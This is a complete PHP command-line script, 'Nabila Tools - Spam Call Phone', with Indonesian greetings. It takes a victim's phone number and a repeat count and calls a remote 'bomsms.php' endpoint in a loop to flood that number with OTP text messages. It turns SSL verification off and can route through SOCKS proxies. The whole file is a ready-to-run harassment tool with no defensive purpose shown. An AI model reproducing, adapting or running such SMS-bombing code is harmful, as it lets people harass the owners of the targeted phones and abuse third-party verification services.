<?php
date_default_timezone_set("Asia/Jakarta");
date_default_timezone_set("Asia/Makassar");
function curl($url, $data = null, $headers = null, $proxy = null, $method = null) {

        $ch = curl_init();
        $options = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_SSL_VERIFYHOST => 0,
                CURLOPT_SSL_VERIFYPEER => 0,
                //CURLOPT_HEADER => true,
                CURLOPT_TIMEOUT => 30,
                CURLOPT_FOLLOWLOCATION => true,
        );

        if ($method != "") {
                $options[CURLOPT_CUSTOMREQUEST] = $method;
        }
                                                                                                        if ($data != "") {
                $options[CURLOPT_POST] = true;
                $options[CURLOPT_POSTFIELDS] = $data;
        }
                                                                                                        if ($proxy != "") {
                $options[CURLOPT_HTTPPROXYTUNNEL] =  true;
                $options[CURLOPT_PROXYTYPE] =  CURLPROXY_SOCKS4;
                $options[CURLOPT_PROXY] =  $proxy;
        }

        if ($headers != "") {
                $options[CURLOPT_HTTPHEADER] = $headers;                                                }

        curl_setopt_array($ch, $options);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;

}
function color($color = "default" , $text)
        {
        $arrayColor = array(
                'grey'          => '1;30',
                'red'           => '1;31',
                'green'         => '1;32',
                'yellow'        => '1;33',
                'blue'          => '1;34',
                'purple'        => '1;35',
                'nevy'          => '1;36',
                'white'         => '1;0',
        );
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
    }
    function hari_ini(){
	$hari = date ("D");
 
	switch($hari){
		case 'Sun':
			$hari_ini = "Minggu";
		break;
 
		case 'Mon':			
			$hari_ini = "Senin";
		break;
 
		case 'Tue':
			$hari_ini = "Selasa";
		break;
 
		case 'Wed':
			$hari_ini = "Rabu";
		break;
 
		case 'Thu':
			$hari_ini = "Kamis";
		break;
 
		case 'Fri':
			$hari_ini = "Jumat";
		break;
 
		case 'Sat':
			$hari_ini = "Sabtu";
		break;
		
		default:
			$hari_ini = "Tidak di ketahui";		
		break;
	}
 
	return " " . $hari_ini . ", ";
 
}
echo "\nNabila Tools - Spam Call Phone\n";
$b = time();
$hour = date("G",$b);

if ($hour>=0 && $hour<=11)
{
echo "Selamat Pagi, a";
}
elseif ($hour >=12 && $hour<=14)
{
echo "Selamat Siang, a";
}
elseif ($hour >=15 && $hour<=17)
{
echo "Selamat Sore, a";
}
elseif ($hour >=17 && $hour<=18)
{
echo "Selamat Petang, a";
}
elseif ($hour >=19 && $hour<=23)
{
echo "Selamat Malam, a";
}
echo "\nHari ini adalah Hari". hari_ini()."".date('d-m-Y | H:i:A')."";
echo "\nThanks To : Pandu, Ikhsan\n\n";
echo color("white","[?] ")."No HP: ";
$no = trim(fgets(STDIN));
echo color("white","[?] ")."Jumlah: ";
$jum = trim(fgets(STDIN));
for($a=1;$a<=$jum;$a++){
$sms = curl('https://izzy27.000webhostapp.com/bomsms.php?Nope='.$no);
if($sms == "Success send otp"){
echo color("green","[✓] ").$sms.color("green"," [".$a."]\n");
}else{
echo color("red","[x] ").$sms.color("red"," [".$a."]\n");
}
}
